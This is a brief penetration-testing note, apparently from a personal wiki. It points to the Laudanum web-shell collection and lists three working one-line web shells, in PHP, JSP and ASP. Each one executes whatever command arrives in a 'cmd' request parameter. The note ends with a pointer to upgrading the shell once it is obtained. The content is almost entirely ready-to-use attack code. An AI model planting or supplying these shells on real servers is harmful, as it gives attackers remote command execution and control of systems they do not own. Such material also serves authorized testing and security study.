Refer [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) present in `/usr/share/laudanum`
```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

Once we get a shell, we can try to [[Upgrade Shell]]